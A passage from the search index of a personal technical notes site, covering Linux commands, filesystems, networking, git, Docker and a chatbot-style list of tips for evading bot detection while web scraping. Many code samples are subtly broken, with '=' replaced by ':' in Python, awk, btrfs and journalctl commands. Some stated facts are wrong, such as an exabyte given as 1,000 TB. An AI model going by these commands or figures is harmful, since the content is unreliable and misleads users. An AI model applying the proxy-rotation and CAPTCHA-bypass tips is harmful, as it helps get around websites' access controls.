a network.</p> </li> <li> <p>Secure Communication: TPMs can be used in conjunction with     cryptographic protocols to securely store and manage keys required     for establishing secure communication channels like     TLS_SSL connections. This ensures     that keys are protected from unauthorized access or tampering.</p> </li> <li> <p>Data Integrity and Sealing: TPMs can seal data, ensuring that it     can only be decrypted and accessed on the same system where it was     originally created. This helps protect sensitive data from being     moved to other systems without proper authorization.</p> </li> </ol> <p>[!quote]</p>"},{"location":"docs/UEFI_vs_BIOS/","title":"UEFI vs BIOS","text":"<p>Boot procces</p> UEFI BIOS Unified Extenxsible FIrmware Interface Basic Input Output System Uses Partition(storse the system there) Config stored on the motherboard support for the big drives 2 TB drive new old secure boot postsdigital key that system is not malware Digital_certificate <p>bug!</p> <p>Some computers refer to UEFI as BIOS ### Partition types</p> MBR(Master Booot Record) GPT(GUID partition table) One partion when the hardrive info is stored (at the beginning of the hard drive) Hard drive info stored in multiple places on the hard driveh <p>[!important] GPT creates fake Master record in order to be compatible with the Bios</p> <p></p>"},{"location":"docs/VOIP/","title":"VOIP","text":""},{"location":"docs/VOIP/#voice-over-internet-protocol","title":"Voice over Internet Protocol","text":"<p>There are many types of VoIP servers, including those designed for business use, for residential use, and for use by telecommunications providers. These servers can handle different types of VoIP protocols, like SIP (Session Initiation Protocol) and RTP (Real-time Transport Protocol), and may also include features for managing call routing, voicemail, call recording, automated attendants, and other functions.</p> <p>[!quote]</p>"},{"location":"docs/VPC/","title":"VPC","text":""},{"location":"docs/VPC/#vpc-network","title":"VPC network","text":"<ul> <li>Virtual Private Cloud Gateway<ul> <li>Connects users on the internet</li> </ul> </li> <li>VPC Endpoint<ul> <li>Direct connection between clodu provider networks &gt;[!example]-     VPC Schema     </li> </ul> </li> </ul> <p>[!bug]- Vm Sprawl The virtual machines are sprawled everywhere - you\u2019r not sure which VMs are reacted to which applications - It becomes extremely difficult to deproveision</p> <ul> <li>[Golang_AWS_issue]({{\\&lt; ref     \u201cposts/PROGRAMMING/go/Golang_AWS_issue.md\u201d&gt;}})</li> <li>VPN</li> </ul>"},{"location":"docs/VPN/","title":"VPN","text":""},{"location":"docs/VPN/#virtual-private-networks","title":"Virtual Private Networks","text":"<p>Encrypted (private) data traversing a public network as opposite to GRE_prtocol ## VPN protocols IPSec_protocol ## VPN Concentrator - Device that Encrytp/Decrypt the data - Often interateed into [[firewall]]</p> <ul> <li>There are allso alternatives both softwera and hardwer options tha     can performe same functionality<ul> <li>Sepcialized cryptographic hardwer</li> <li>Softwer</li> <li>Somtime built into os</li> </ul> </li> </ul> <p>[!quote] ports</p>"},{"location":"docs/Zombie_process/","title":"Zombie process(Z)","text":"<p>The child process that finish his job but it\u2019s not being cleaned Ussualy have to get rid of the parent find zombie processes</p> <pre><code>ps ux | awk '{if($8==\"Z\") print}'\n</code></pre> <p>When u\u2019re done check for u little creations</p>"},{"location":"docs/Zombie_process/#spawn-zombies-with-python","title":"Spawn zombies with python","text":"<p>Docs</p> <pre><code>import os, sys, time\nttlForParent: 60;\nfor i in range(0, 10):\n# This creates the copy of the main process as \n# a child process but with diffrent PID \n   pid_1: os.fork()\n   print(pid_1)\n   print(\"Hello Worlds!!!\")\n   if pid_1 == 0:\n       sys.exit();\ntime.sleep(ttlForParent);\nos.wait()\n</code></pre> <p>awk</p>"},{"location":"docs/awk_command/","title":"Awk","text":"<p>The awk contains blocks</p>"},{"location":"docs/awk_command/#skip-headers-and-empty-lines","title":"Skip headers and empty lines","text":"<pre><code>awk 'NR &gt; 1 &amp;&amp; $2 != \"\" {print $2}' \n</code></pre> <ul> <li>Givinig new headers to the table     (rename columns)</li> </ul> <pre><code>awk ' BEGIN{ printf \"Sr No\\tName\\tSub\\tMarsk\\n\"}\n\n{print} file.txt' \n</code></pre> <ul> <li>If for some raeson u want to use awk itself use -f flag</li> <li> <p>Varaibles</p> <ul> <li>-v allows to pushc a varaible into the command</li> </ul> <pre><code>awk -v name: Jerry 'BEGIN{printf \"Name = %s\\n\", name}'\n</code></pre> </li> </ul>"},{"location":"docs/awk_command/#patterns","title":"Patterns","text":"<ul> <li>Searching for an pattern<ul> <li>it has to be in \u201c/pattern/\u201d</li> <li>its important that this will output the entire row</li> <li></li> </ul> </li> <li>Counting Matches (in a loop)<ul> <li>Important to add END without it will print each iteration</li> </ul> </li> <li> <p>Counting letters</p> <ul> <li>Awk has builtin function called lenght that returns the     lenght of the string 1</li> </ul> <p><pre><code>awk 'length($0) &gt; 18' marks.tx\n</code></pre> -   Ignore Case</p> </li> </ul> <pre><code>awk 'BEGIN{IGNORECASE: 1} /amit/' marks.txt\n</code></pre>"},{"location":"docs/awk_command/#awk-functions","title":"Awk functions","text":"<pre><code>awk 'BEGIN {\n   a: 30;\n\n   if (a==10)\n   print \"a: 10\";\n   else if (a == 20)\n   print \"a: 20\";\n   else if (a == 30)\n   print \"a: 30\";\n}'\n</code></pre> <p>Certainly! Below is a Markdown table summarizing the built-in string functions in AWK you mentioned, complete with brief descriptions and examples.</p> Function Description Example <code>asort(arr [, d [, how]])</code> Sorts the array <code>arr</code> and replaces the indexes with sequential integers starting at 1. <code>asort(arr); for (i in arr) { print arr[i]; }</code> <code>asorti(arr [, d [, how]])</code> Sorts the array <code>arr</code> based on array indexes. <code>asorti(arr); for (i in arr) { print arr[i]; }</code> <code>gsub(regex, sub, string)</code> Performs global substitution of <code>regex</code> with <code>sub</code> in <code>string</code>. <code>gsub(\"World\", \"Jerry\", str);</code> <code>index(str, sub)</code> Finds the position where <code>sub</code> starts in <code>str</code>. Returns 0 if not found. <code>index(\"One Two Three\", \"Two\");</code> <code>length(str)</code> Returns the length of <code>str</code>. <code>length(\"Hello, World !!!\");</code> <code>match(str, regex)</code> Returns the index of the first longest match of <code>regex</code> in <code>str</code>. Returns 0 if not found. <code>match(\"One Two Three\", \"Two\");</code> <code>split(str, arr, regex)</code> Splits <code>str</code> into an array <code>arr</code> based on <code>regex</code>. <code>split(\"One,Two,Three,Four\", arr, \",\");</code> <code>printf(format, expr-list)</code> Returns a formatted string. <code>printf(\"sqrt(%f) = %f\\n\", 1024.0, sqrt(1024.0));</code> <code>strtonum(str)</code> Returns the numeric value of <code>str</code>. <code>strtonum(\"123\"); strtonum(\"0123\"); strtonum(\"0x123\");</code> <code>sub(regex, sub, string)</code> Replaces the first occurrence of <code>regex</code> with <code>sub</code> in <code>string</code>. <code>sub(\"World\", \"Jerry\", \"Hello, World\");</code> <code>substr(str, start, l)</code> Returns a substring of <code>str</code> starting at <code>start</code> of length <code>l</code>. <code>substr(\"Hello, World !!!\", 1, 5);</code> <code>tolower(str)</code> Converts all upper-case characters in <code>str</code> to lower-case. <code>tolower(\"HELLO, WORLD !!!\");</code> <code>toupper(str)</code> Converts all lower-case characters in <code>str</code> to upper-case. <code>toupper(\"hello, world !!!\");</code> <p>grep</p>"},{"location":"docs/backlog/","title":"backlog","text":"<p>Parameter which determines how many connection can be stored in Accept Queue</p>"},{"location":"docs/bots_gtp_recomendations/","title":"Rate Limiting Strategies for Web Scraping","text":""},{"location":"docs/bots_gtp_recomendations/#slow-down-requests","title":"Slow Down Requests","text":"<ul> <li>Many simple bot detectors trigger based on the request rate.     Slowing down your requests can sometimes help.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques","title":"Techniques:","text":"<ol> <li>Randomized Intervals: Instead of sending requests at a constant     interval, randomize the times at which you send requests.</li> </ol>"},{"location":"docs/bots_gtp_recomendations/#request-headers","title":"Request Headers","text":"<ul> <li>Customizing request headers can make bots less detectable.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques_1","title":"Techniques:","text":"<ol> <li>User Agents: Rotate user-agent strings to mimic different     browsers and devices.</li> <li>Referrers: Use realistic referrer URLs.</li> </ol>"},{"location":"docs/bots_gtp_recomendations/#ips-and-networking","title":"IPs and Networking","text":"<ul> <li>Avoid detection by changing your network attributes.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques_2","title":"Techniques:","text":"<ol> <li>IP Rotation: Rotate through a list of proxy servers so that     requests appear to come from multiple users.</li> <li>Residential Proxies: Use residential IPs instead of datacenter     IPs as some websites block or limit datacenter IPs.</li> </ol>"},{"location":"docs/bots_gtp_recomendations/#behavioral-mimicry","title":"Behavioral Mimicry","text":"<ul> <li>Simulating human-like behavior can sometimes make bots harder to     detect.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques_3","title":"Techniques:","text":"<ol> <li>Human Behavior Simulation: Adding random clicks, mouse     movements, and scroll actions.</li> <li>Sequential Page Navigation: Access pages in a sequence that a     human might follow.</li> </ol>"},{"location":"docs/bots_gtp_recomendations/#captchas","title":"CAPTCHAs","text":"<ul> <li>Some scraping activities might trigger CAPTCHAs, which are     designed to distinguish bots from humans.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques_4","title":"Techniques:","text":"<ol> <li>Manual Intervention: For CAPTCHAs, some services allow for     manual human intervention to solve them.</li> <li>CAPTCHA Solving Services: There are also automated services that     claim to solve CAPTCHAs, though these are often against the terms of     service of most websites.</li> </ol>"},{"location":"docs/bots_gtp_recomendations/#cookies-and-sessions","title":"Cookies and Sessions","text":"<ul> <li>Maintaining state between requests can also be useful.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques_5","title":"Techniques:","text":"<ol> <li>Session Maintenance: Keep track of cookies to maintain sessions,     which can sometimes bypass security checks.</li> <li>LocalStorage and JavaScript: Some advanced scrapers maintain a     JavaScript environment to mimic human interactions better.</li> </ol>"},{"location":"docs/bots_gtp_recomendations/#request-timing","title":"Request Timing","text":"<ul> <li>Timing your requests can also play a role in avoiding detection.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques_6","title":"Techniques:","text":"<ol> <li>Day Parting: Some scrapers find success in only sending requests     during specific hours</li> </ol>"},{"location":"docs/bots_gtp_recomendations/#web-drivers","title":"Web Drivers","text":"<ul> <li>Some scrapers use real browsers to simulate interactions more     convincingly.</li> </ul>"},{"location":"docs/bots_gtp_recomendations/#techniques_7","title":"Techniques:","text":"<ol> <li>Real Browsers: Use a real browser driver like Selenium or     Puppeteer.</li> </ol> <p>Disclaimer: Remember that even if you\u2019re not blocked by a website, your actions can still be illegal or against the terms of service of the website you\u2019re interacting with. Always respect robots.txt and terms of service, and when in doubt, seek legal advice.</p> <p>Sneakers bots project</p>"},{"location":"docs/bridge_net/","title":"Bridge network","text":"<p>Virtual or psychical device that connect multiple LAN\u2019s</p> <p> - All parts of the bridge will get their collision domain Bug</p> <p>Collisions</p> <p>When to or more devices on the same network try to transmit data at the exact same time (some packet will be doped)</p>"},{"location":"docs/bridge_net/#docker-bridging","title":"Docker bridging","text":"<ul> <li>Default docker bridge doesn\u2019t     allow for the DNS change<ul> <li>U have to create one</li> <li>Dns Name is the same as the container name</li> </ul> </li> </ul> <pre><code>docker network create my-bridge-net --subnet  10.0.0..0/19 --gateway 10.0.0.1\n</code></pre> <p>Example</p> <p>Docker compose </p> <p>NAT</p> <p>Host-net</p>"},{"location":"docs/btrfs/","title":"btrfs","text":"<p>U can mount 2 drives as one</p> <pre><code>btrfs device add\n</code></pre> <ul> <li> <p>U can easly conver it to the Raid 1 mirror     array for the data protection</p> <pre><code>btrfs balance start -mconvert: raid1 -dconvert=raid1 test\n</code></pre> </li> <li> <p>Can do snapschot</p> </li> <li> <p>Can do sub volumes</p> </li> </ul>"},{"location":"docs/carrige_return/","title":"Carrige return vs line Feed","text":"<p>Control characters that appear to the text file to innit to the printer that it should rerun the carriage and feed the line</p> <ul> <li>Line Feed \u201c\u201d</li> <li>Carriage Return \u201c</li> </ul> <p>HTTPS and HTTP format is Linefid + Carraige</p> <p> - On windosw - There are only carriage returns and line feed - On Linux (an in rest of the world) there are line feeds - On Mac there are only carriage returns</p>"},{"location":"docs/cgroups/","title":"Control groups","text":"<ul> <li>Organize all process in the system</li> <li>Account for resource usage and gather utilization data</li> <li>Limit or prioritize resources utilization</li> </ul>"},{"location":"docs/cgroups/#subsystem","title":"Subsystem","text":"<ul> <li>Control group system in an abstract framework</li> <li>Concrete implementation of the control group s</li> <li>Subsystem can organize process separately<ul> <li>Most of them are resource controller</li> </ul> </li> </ul> <p>[!example]- - Memory - Cpu -Cpu time - Block I/O -PID\u2019s - Freezer(used by docker pause ) - Devices - Network priority</p>"},{"location":"docs/cgroups/#hierarchical-representation","title":"Hierarchical representation","text":"<ul> <li>Task virtual file holds all     PID\u2019s in the cgroup</li> <li>Other files have setting and utilization data</li> </ul> <p>Namespaces</p> <p>Kernel</p>"},{"location":"docs/cgroups/#cgroup-virtual-filesystem-mouted-at-sysfscgroup-","title":"Cgroup virtual filesystem - Mouted at /sys/fs/cgroup -","text":"<p>There are mostly just interfaces</p>"},{"location":"docs/chage/","title":"chage","text":"<p>The configuration is stored in  <code>/etc/login.defs</code> <code>PASS_MAX_DAYS</code>   90   # Maximum days before password expires <code>PASS_MIN_DAYS</code>   7    # Minimum days before changing password again <code>PASS_WARN_AGE</code>   14   # Warn users 14 days before expiration Enables to set the password expire date</p> <p>Example </p> <p>Example </p>"},{"location":"docs/charoot/","title":"charoot","text":"<p>Allows to control access to a servie or filesystem whiel controling the expouser to the underling server - during the boot sequence (emergency shell) - secure FTP (SFTP)</p> <pre><code>chroot &lt;newroot&gt;[[command] arguemnts]\n</code></pre> <p>Charoot sftp 1 Web Charoot sftp 2 Web</p> <p>utilized within the phone operating system. ## Virtual Environment: It operates as a virtual environment with root user privileges, providing a secure and isolated space for applications. ## Access Restrictions: Users can only access the specified tools within this environment, preventing interaction with other parts of the system.</p>"},{"location":"docs/charoot/#mount-bind","title":"Mount Bind","text":"<p>Mount bind is employed to provide access to host system resources within the chroot directory.</p> <p>Namespaces</p>"},{"location":"docs/chattr/","title":"Change attribute","text":"<p>The chattr command in Linux is a powerful tool for managing file attributes, offering features like setting the sticky bit and making files immutable.</p>"},{"location":"docs/chattr/#sticky-bit-t","title":"Sticky Bit (t):","text":"<p>The sticky bit, denoted by \u2018t\u2019, is a special file attribute primarily applied to directories. When set on a directory, it restricts the deletion of files within that directory to the file owner, directory owner, or root user. Usage:</p> <pre><code>chattr +t directory_name\n</code></pre>"},{"location":"docs/chattr/#immutable-attribute-i","title":"Immutable Attribute (i):","text":"<p>The immutable attribute, denoted by \u2018i\u2019, prevents a file from being modified, deleted, renamed, or linked to by any user, including the root user.</p> <pre><code>chattr +i filename\n</code></pre> <p>getfacl</p>"},{"location":"docs/cloud-int/","title":"cloud-int","text":"<p>Docs</p> <ul> <li>Developed server instance</li> <li>Set\u2019s up server based on metadata</li> </ul>"},{"location":"docs/cloud-int/#cloud-init-modules","title":"Cloud init modules","text":"<p>Cloud-init modules</p> <p>Users and Groups</p> <p>Metadata - for cloud instance Docker</p>"},{"location":"docs/cloud_data_types/","title":"Cloud data types","text":"Storage Type Description Key Features File Storage Data is stored in files organized in folders, which are arranged in a hierarchy of directories. Easy to manage- Suitable for unstructured data Block Storage Stores blocks of binary data, similar to <code>Protobufs</code>. Unique identifiers- High performance Object Storage Data is stored in unstructured objects with associated metadata. Virtually unlimited scalability- Lower cost for large volumes of data Instance Storage Provides temporary block-level storage for Amazon EC2 instances, located on disks attached to the host computer. Ideal for temporary storage of frequently changing information. - Ephemeral storage- Varies by instance type and size- Suitable for buffers, caches, and scratch data"},{"location":"docs/compilers/","title":"compilers","text":""},{"location":"docs/compilers/#compilers","title":"Compilers","text":"<ul> <li>The binary instructions are written in machine language, an     elementary language the Cpu can     understand.</li> <li>Compilers are designed to translate the language of C code into     machine language for a variety of processor architectures.</li> </ul>"},{"location":"docs/compilers/#processor-architacture","title":"Processor Architacture","text":"<ol> <li>x86 architecture</li> <li>Sparc processor architectures (used in Sun Workstations)</li> <li>PowerPC processor architecture (used in pre-Intel Macs)</li> </ol>"},{"location":"docs/compilers/#examine-binaries","title":"Examine Binaries","text":"<p>Use objdump</p> <p>[!quote] Compitaltion process</p>"},{"location":"docs/controlesrs_rob/","title":"controlesrs rob","text":""},{"location":"docs/controlesrs_rob/#types-of-controlers","title":"Types of controlers","text":"<ul> <li>Open controllers<ul> <li>The output does not affecte the control output<ul> <li>If the machine goes straightforward no matter what or is     being controlled directly by joystick</li> </ul> </li> </ul> </li> <li>Closed controllers<ul> <li>The environment influence the robot behavior<ul> <li>*Robot makes constat calcualtion *</li> <li>closed_loop_control</li> </ul> </li> </ul> </li> </ul> <p>[!quote] startup_robotics</p>"},{"location":"docs/core_fiels/","title":"Core fiels","text":"<p>Snapshot of a process\u2019s memory that later can be passed to the debuuger like <code>gdb</code></p> <p>Usful for debuging the program crashes</p> <pre><code># U have to rise the limit for the curret shell to generate one\nulimit -c unlimited\n</code></pre> <p>limits.conf</p>"},{"location":"docs/css_position/","title":"css position","text":""},{"location":"docs/css_position/#css-positioning","title":"CSS positioning","text":"<ul> <li>Static<ul> <li>The default position one by one     </li> </ul> </li> <li>Relative<ul> <li>U can change top bot left and right of this element</li> <li>It take it ==out of document flow== and position it those     speechified pixels<ul> <li>It has no influence one the other elements potions     </li> </ul> </li> </ul> </li> <li>Absolute<ul> <li>Completly removes element from the document flow (its postion     from the top not relative to any element)<ul> <li>Everything renders as the element does not exits</li> <li></li> </ul> </li> </ul> </li> <li>Fixed<ul> <li>The are positon based on the hole html and they stay while     scrolling     </li> </ul> </li> <li>Sticky<ul> <li>It\u2019s relative unless it leaves the page then it becomes     fixed</li> </ul> </li> </ul> <p>[!quote] [[canvas_html]]</p>"},{"location":"docs/current_rob/","title":"current rob","text":""},{"location":"docs/current_rob/#current-i","title":"Current (I)","text":"<ul> <li>The flow of electric charge through a conductor or circuit. (t     measures the speed at which electricity flows through a cable or any     other conductor)<ul> <li>It represents the rate of flow of electrons or other charge     carriers. Current is measured in amperes (A) and is often     simply referred to as \u201camps.</li> </ul> </li> </ul> <p>V\u2004:\u2004I\u2005*\u2005R</p> <p>[!quote] voltage_rob resistance_rob</p>"},{"location":"docs/e2fsck/","title":"e2fsck","text":"<pre><code>This utility tries to fix any problems that were created when the system went down without properly dismounting the disk.\n</code></pre> <p>fsck [[Files systems.canvas|Fiels systems]] Commands_filesSytem</p>"},{"location":"docs/emacs_treestier_nativ/","title":"Native treesiter in emacs","text":"<p>Docs</p> <p>In order to naitvly complie wiht the json parse and treesiter</p> <ol> <li>Install the latest verison of the Emacs</li> </ol> <pre><code>git clone https://git.savannah.gnu.org/git/emacs.git\n</code></pre> <ol> <li>Chose compilation otpions</li> </ol> <pre><code>cd emacs\n./autogen.sh\n./configure --without-compress-install --with-native-compilation --with-json --with-tree-sitter \n</code></pre>"},{"location":"docs/encrypted_Web_traffic/","title":"encrypted Web traffic","text":"<p>Example </p>"},{"location":"docs/ext2/","title":"ext2","text":"<pre><code>#### Second Extended File System\n</code></pre> <p>(the oldest) #### Architecture - Data is stored in files; files are stored in directories. A directory can contain either files or other directories (sub directories). - The max file size is 2TB - files name can be up to 255 characters long - The volume is up to 4b</p> <p>[!bug]- ext2 takes a lot of time to recover To clean up the file system, the ext2 will automatically run a program called e2fsck the next time the system is booted.</p> <p>If it finds nonallocated files or unclaimed blocks of data, it will write this information in a directory called lost+found. By doing this, ext2 tries to ensure that data integrity is maintained in spite of the improper shutdown.</p> <p>The issue here is that e2fsck will analyze the entire file system when this happens, not just the last few files that were in the process of being modified</p> <p>ext3 ext4 [[Files systems.canvas|Fiels systems]]</p>"},{"location":"docs/ext3/","title":"ext3","text":"<pre><code>    ### Third Extended File System\n</code></pre> <ul> <li>It\u2019s baiscly ext2 but with journal<ul> <li>Disk recovery time after an improper shutdown takes dramatically     less time<ul> <li>Because it has a log of the most recent transactions in     the journal, simply checks the that are listed as incomplete</li> </ul> </li> </ul> </li> </ul> <p>[!note]- You can easily upgrade ext2 systems to ext3 and vice versa.</p> <p>Files systems</p>"},{"location":"docs/ext4/","title":"ext4","text":"<pre><code>### Fourth Extended File System\n</code></pre> <ul> <li>The max voulme is 1 exabyte(1,000 TB)<ul> <li>Max file size is 16TB</li> <li>Max 4 billion files<ul> <li>maximum length of a file name is 256 bytes</li> </ul> </li> </ul> </li> </ul> <p>[!tip]- You can easily upgrade ext3 to ext4 and vice versa.</p> <p>[[Files systems.canvas|Fiels systems]]</p>"},{"location":"docs/frequency_issues_rob/","title":"Fromula","text":"<pre><code>$$ Noise: y(t) = A \\sin(\\omega_1 t + \\phi_1) + B \\sin(\\omega_2 t + \\phi_2) $$\n$A$ $and$ $B$ are the ==aplitudes== of two signals \n$\\omega_1$ $and$ $\\omega_2$  are the ==angular== frequencies (*in rad/s*).\n$\\phi_1$ $and$ $\\phi_2$  are the phase ==angles== of the two signals (*in radians*).\n\n$$ \\frac{dy(t)}{dt} = A \\omega \\cos(\\omega t + \\phi) $$\n</code></pre>"},{"location":"docs/getent/","title":"getent","text":"<p>Retrieve entries from various databases</p> <ul> <li>passwd (user account)</li> <li>group (group account),</li> <li>hosts (hostnames and IP addresses), and services (network     services) databases.<ul> <li>It is particularly useful for querying system databases,     providing a consistent interface across different Unix-like     operating systems.</li> </ul> </li> </ul> <pre><code>getent  passwd  aura\n</code></pre> <p>passwd</p>"},{"location":"docs/getfacl/","title":"ACL","text":"<p>Add more specific permission - getfacl - setfacl &gt;Example &gt;</p> <ul> <li>Look for the + symbol on the ls<ul> <li>It show that smth was changed</li> </ul> </li> </ul> <p>Set the Acli <pre><code>setfacl u:nix:rw\nsetfacl g:builders:0\n</code></pre></p> <p>chattr</p>"},{"location":"docs/gh_cli/","title":"Gh Cli","text":"<pre><code>Host github.com\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/id_ed25519_specific\n  IdentitiesOnly yes\n</code></pre>"},{"location":"docs/git/","title":"git","text":""},{"location":"docs/git/#seting-up-github","title":"Seting up github","text":"<ol> <li>ssh</li> <li>setinging user</li> </ol> <pre><code>git config --global user.name 'aura'\n</code></pre>"},{"location":"docs/git/#git-log","title":"Git Log","text":"<p>To better display the commits</p> <pre><code>git log --oneline \n</code></pre> <pre><code>git config --global user.email DefnotFreddie@defnotfreddie@gmail.com\n</code></pre> <p>[!tip]- It has to be u\u2019re gti name </p>"},{"location":"docs/git/#creating-the-branch","title":"Creating the branch","text":"<pre><code>git switch -c &lt;branch name&gt;\n</code></pre>"},{"location":"docs/git/#add-files","title":"Add files","text":"<ul> <li>It add files that haven\u2019t been added yet</li> </ul> <pre><code>git -A . \n</code></pre> <ul> <li>Add interactivle</li> </ul> <pre><code>git add -p \n</code></pre> <p>[!example]- </p>"},{"location":"docs/git/#pulling-submodels","title":"Pulling submodels","text":"<pre><code>git submodule update --init\n</code></pre>"},{"location":"docs/git/#merge-vs-rebase","title":"Merge vs Rebase","text":"<p>[!bug] Use rebase locally </p>"},{"location":"docs/git/#undo-the-megre","title":"Undo the megre","text":"<pre><code>git merge --abrot\n</code></pre> <pre><code>git rebase --abrot\n</code></pre> <p>[!quote] docker</p>"},{"location":"docs/gpg/","title":"Gnu Pg","text":"<p>Docs - Linux utility that verifies the [[Digital certificate|digital signature]] of the package - It\u2019 usually marked with the checksum file</p>"},{"location":"docs/gpg/#doing-it-manually","title":"Doing it manually","text":"<pre><code>sha256sum -c SHA256SUMS\n</code></pre>"},{"location":"docs/gpg/#doing-it-with-the-gpg","title":"Doing it with the gpg","text":"<pre><code>gpg --verify SHA256SUMS.sign SHA256SUMS\n</code></pre> <p>[!bug] U most likely get a meessage Can\u2019t get the signature No public key This means you don\u2019t have the public key on your computer, which is normal. You have to import it from a keyserver.</p> <pre><code>gpg --keyserver keyring.debian.org --recv-keys DF9B9C49EAA9298432589D76DA87E80D6294BE9B\n</code></pre>"},{"location":"docs/host_net/","title":"host net","text":"<pre><code>[Containers](../Containers) Share the same networkin  [Namespaces](../Namespaces) as  host\n</code></pre> <ul> <li>no NAT</li> <li>no proxy \u2013network     host flag</li> </ul> <pre><code>docker run -d --name test --network host aura/myapp-188:v3\n</code></pre> <p>bridge_net overlay_net docker</p>"},{"location":"docs/http_headers/","title":"http headers","text":""},{"location":"docs/http_headers/#http-headers","title":"Http Headers","text":"<p>[!quote] ports</p>"},{"location":"docs/iSCSI/","title":"iSCSI","text":""},{"location":"docs/iSCSI/#internet-small-computer-system-interface","title":"Internet Small computer System Interface","text":"<ul> <li> <p>Send SCSI commands</p> </li> <li> <p>Now RFC_Standard</p> </li> <li> <p>Makes remote disk look and operate like local disk</p> <ul> <li>Like Fibre_chanel</li> </ul> </li> <li> <p>Can be managed quite well in software</p> <ul> <li>Drivers available for many operating systems</li> <li>==No proprietary topologies or hardwere needed==</li> </ul> </li> <li> <p>To proviede redudance use Multipath     techinqe</p> </li> </ul> <p>[!tip]- Conecti iSCSI on boot 1. edit iscsid.con and change the mannual startup to automatic 2. do the same in /etc/iscsi/nodes in every file</p> <p>[!quote] FCoE SAN NAS</p>"},{"location":"docs/init/","title":"init","text":"<p>Example reboot a system withou the systemd  <pre><code>exec /sbin/init 6 \n</code></pre> Chnaging root Password</p> <p>Reboot the system with systemd </p> <pre><code>exec /usr/lib/systemd/system\n</code></pre> <ul> <li>First process on the machine(PID 1)</li> </ul> <p>[!tip] The kernel starts init directly Init starts everything else The mommy of the systems - It take care of orphan process by reasinging the parent - It get rids of the zombie procces - Run Levels(old)</p>"},{"location":"docs/inodes/","title":"Inode structure","text":"<ul> <li>File size</li> <li>reference count</li> <li>permission</li> <li>etc</li> </ul> <p>[!tip] Files don\u2019t have metadata - They are just file name and inode member (pointer) - Directories are just table of file names and inodes</p> <p>Inodes count is setup on the file system creation</p> <p>except zfs ## Inodes creation If you\u2019re talking about ext4 filesystems, it\u2019s based on the size of the filesystem.</p> <p>ArchWiki</p>"},{"location":"docs/inodes/#determine-the-amount-of-inodes-on-the-system","title":"Determine the amount of inodes on the system","text":"<pre><code>df -iT | awk 'NR &gt; 1 {print $3}' | awk '{sum +=$1} END {print sum}'\n</code></pre> <ul> <li>Hardlink</li> <li>Inodes exhaustion</li> <li>Journaled Filesystem</li> </ul>"},{"location":"docs/inodes_exhaustion/","title":"inodes exhaustion","text":"<p>U can create a file because u used all the Inodes - can happen when u have a ton of small files (cache files)</p> <ul> <li>hardlinks doesn't occupy any other aditonal indoes</li> </ul>"},{"location":"docs/ioStat/","title":"ioStat","text":"<pre><code>- Check the I/O stat of the computer \n- The defult without the flags show only what happend after the boot\n</code></pre> <p>[!tip] look for the %util</p> <pre><code>iostat -hymx 1 4 \n</code></pre> <p>Only things that have activity -xz</p> <ul> <li>Install ioTop with the -o* flag<ul> <li>to filter the processes that only use I/O on the machine</li> </ul> </li> </ul> <p>command</p>"},{"location":"docs/ip_command/","title":"ip command","text":""},{"location":"docs/ip_command/#to-show-dropped-packet","title":"To show dropped packet","text":"<pre><code>ip -s link show {inerface}\n</code></pre> <p>[!example] </p>"},{"location":"docs/iptables/","title":"iptables","text":""},{"location":"docs/iptables/#chains","title":"Chains","text":"<ul> <li>Tags that define and match packet to the     state &gt;[!Overview] &gt;k     #### Setting default policy</li> </ul> <pre><code>iptables --policy CHAIN  METHOD\n</code></pre> <p>It\u2019s recommended to set up it to accep first and then change it</p>"},{"location":"docs/iptables/#filter-table","title":"Filter table","text":"<ul> <li>filtering incoming traffic<ul> <li>fire wall stuff</li> </ul> </li> </ul>"},{"location":"docs/iptables/#rules","title":"Rules","text":"<p>Rules are applied from the top to the bottom</p> <ul> <li>to list</li> </ul> <pre><code>sudo iptables -L\n</code></pre> <ul> <li>to append</li> </ul> <pre><code>iptables -A CHAIN  -s(source) 10.0.0.1 -j(target Rule) DROP\n</code></pre> <ul> <li>to put on top</li> </ul> <pre><code>iptables -I -A CHAIN  -s(source) 10.0.0.1 -j(target Rule) DROP\n</code></pre> <p>Accept - Stop proccesing and allow the packet to flow to the service</p> <p>Reject - Stop the packet and send feedback to the user</p> <p>Drop - Drop packet and don\u2019t inform anyone</p> <p>[!note] If the packet doesn\u2019t match the rule it would be matched by the default rule If no default rule the packet will be accepted</p>"},{"location":"docs/iptables/#blocking-ports","title":"Blocking Ports","text":"<pre><code>iptables -I INPUT -p -tcp -dport 80\n</code></pre>"},{"location":"docs/iptables/#nat-table","title":"NAT table","text":"<ul> <li>Redirect to different interfaces ### Mangle table</li> <li>Modifying packets and connections</li> </ul>"},{"location":"docs/journalctl/","title":"journalctl","text":"<p>Docs ### Filter logs based on UID, GID and PID</p> <pre><code>journalctl _PID: 1234\n</code></pre>"},{"location":"docs/journalctl/#show-a-specified-log-level","title":"Show a specified log level","text":"<p>This is for the error <code>journalctl -p 3 -xb</code></p> <p>-p, \u2013priority=</p> <p><code>Disclaimer</code> To see boot time use [systemd-analyze]</p> <p>-b \u2013boot= 0 is for current List sessions \u2013list-boots</p> <p>\u2013disk-usage to see if logs doesn\u2019t float the system</p> Priority Code 0 emerg 1 alert 2 crit 3 err 4 warning 5 notice 6 info 7 debug <p>U can also specfie the range example:</p> <pre><code>jounalct journalctl -p 4..6 -b0\n</code></pre> <p>Search for a specific unit [[systemd#Units|units]]</p> <pre><code>journalctl -u\n</code></pre> <p>To view the logs in the reverse order</p> <pre><code>journalctl -r\n</code></pre> <p>In real time</p> <pre><code>journalctl -f\n</code></pre> <p>Kernel message</p> <pre><code>journalctl -k\n</code></pre>"},{"location":"docs/limits.conf/","title":"limits.conf","text":"<p>Arch Wiki Docs</p> <p>For systemd services, the following files control the limits:</p> <ul> <li><code>/etc/systemd/system.conf</code></li> <li><code>/etc/systemd/user.conf</code></li> <li><code>/etc/systemd/system/unit.d/override.conf</code></li> <li><code>/etc/security/limits.conf</code></li> </ul> <p>Systemd Docs.</p>"},{"location":"docs/limits.conf/#nproc","title":"nproc","text":"<p>The <code>nproc</code> setting defines how many processes a user is allowed to have running at any one time.</p> <p>You can configure this in the <code>/etc/security/limits.conf</code></p> <pre><code># 